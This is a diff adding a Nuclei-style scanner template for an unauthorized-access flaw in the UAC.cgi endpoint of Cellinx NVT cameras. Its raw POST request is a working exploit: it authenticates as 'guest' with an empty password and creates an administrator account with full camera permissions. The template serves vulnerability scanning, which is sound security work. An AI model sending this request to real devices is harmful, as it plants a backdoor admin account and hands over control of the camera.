@@ -1,0 +1,25 @@
+id: Cellinx-NVT-UAC-weak
+info:
+  name: Cellinx-NVT-UAC-weak
+  author: apple
+  severity: info
+  description: Cellinx NVT 摄像机 UAC.cgi 未授权访问漏洞
+  reference:
+    - http://wiki.fofamini.com/2023hw/Cellinx%20NVT%20%E6%91%84%E5%83%8F%E6%9C%BA%20UAC.cgi%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json; charset=UTF-8
+        Accept-Encoding: gzip
+        Content-Length: 200
+
+        {"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"testadm1n3","password":"testtest","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - add_user
